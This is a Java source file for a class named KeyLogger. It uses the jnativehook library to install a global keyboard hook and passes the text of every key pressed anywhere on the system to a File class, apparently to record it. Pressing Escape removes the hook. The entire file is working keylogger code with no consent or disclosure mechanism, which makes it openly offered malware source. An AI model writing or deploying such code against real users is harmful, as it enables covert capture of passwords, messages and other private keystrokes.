package application.keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import application.files.File;

public class KeyLogger implements NativeKeyListener {
	public KeyLogger() {
		try {
          GlobalScreen.registerNativeHook();  
		}
		catch (NativeHookException exception) {
			System.err.println("There was a problem registering the native hook.");
			System.exit(0);
		}
		
		GlobalScreen.addNativeKeyListener(this);
	}
	
	public void nativeKeyPressed(NativeKeyEvent e) {
        new File(NativeKeyEvent.getKeyText(e.getKeyCode()));

        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
				GlobalScreen.unregisterNativeHook();
			} catch (NativeHookException e1) {
				e1.printStackTrace();
			}
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
    }

	public void nativeKeyTyped(NativeKeyEvent e) {
	}
}